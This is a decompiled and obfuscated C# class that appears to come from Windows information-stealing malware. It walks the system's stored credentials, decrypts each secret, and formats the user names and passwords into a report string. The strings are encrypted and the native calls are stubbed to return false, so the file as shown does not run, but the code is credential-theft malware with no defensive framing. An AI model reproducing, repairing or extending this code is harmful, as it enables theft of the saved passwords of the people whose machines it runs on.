using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using Microsoft.VisualBasic.CompilerServices;
using ns4;

namespace ns2;

internal class Class23
{
	public class Class24
	{
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct Struct10
		{
			public int int_0;

			public IntPtr intptr_0;
		}

		public struct Struct11
		{
			public IntPtr intptr_0;

			public IntPtr intptr_1;

			public IntPtr intptr_2;

			public IntPtr intptr_3;

			public FILETIME filetime_0;

			public IntPtr intptr_4;

			public IntPtr intptr_5;

			public IntPtr intptr_6;

			public IntPtr intptr_7;

			public IntPtr intptr_8;

			public IntPtr intptr_9;

			public IntPtr intptr_10;
		}

		public static bool smethod_0(ref Struct10 struct10_0, int int_0, int int_1, int int_2, int int_3, int int_4, ref Struct10 struct10_1)
		{
			return false;
		}

		public static bool smethod_1(string string_0, int int_0, ref int int_1, ref IntPtr intptr_0)
		{
			return false;
		}

		public static object smethod_2()
		{
			string string_ = Class6.smethod_0("KA==", "False");
			int int_ = 0;
			IntPtr intptr_ = IntPtr.Zero;
			IntPtr[] array = null;
			bool flag = smethod_1(Class6.smethod_0("mMXV0s+4z7PX1qaW1c/NppmRCA==", "False"), 0, ref int_, ref intptr_);
			checked
			{
				object result = default(object);
				try
				{
					if (flag)
					{
						array = new IntPtr[int_ - 1 + 1];
						IntPtr intPtr = intptr_;
						int num = int_ - 1;
						for (int i = 0; i <= num; i++)
						{
							ref IntPtr reference = ref array[i];
							reference = Marshal.ReadIntPtr((IntPtr)(intPtr.ToInt32() + IntPtr.Size * i));
							Struct11 @struct = (Struct11)Marshal.PtrToStructure(array[i], typeof(Struct11));
							Struct10 struct10_ = default(Struct10);
							Struct10 struct10_2 = default(Struct10);
							struct10_.intptr_0 = @struct.intptr_5;
							struct10_.int_0 = (int)@struct.intptr_4;
							smethod_0(ref struct10_, 0, 0, 0, 0, 1, ref struct10_2);
							string_ = Class6.smethod_0("WnWAh3ladYCHeVp1gIeJcIaAh3ladYCHeVp1gId5WnUr", "False") + Environment.NewLine + Environment.NewLine + Class6.smethod_0("ebKvw7GFrK+LYyI=", "False") + Marshal.PtrToStringAuto(@struct.intptr_10) + Environment.NewLine + Class6.smethod_0("gKzJ0MafvbqXbxY=", "False") + Marshal.PtrToStringAuto(struct10_.intptr_0) + Environment.NewLine + Environment.NewLine + Class6.smethod_0("cYyXnpBxjJeekHGMl56QcYyXnpBxjJeekHGMl56QcYwU", "False");
						}
						string_0 = string_;
						return result;
					}
					return result;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					string_0 = Class6.smethod_0("KA==", "False");
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}
	}

	public static string string_0;
}
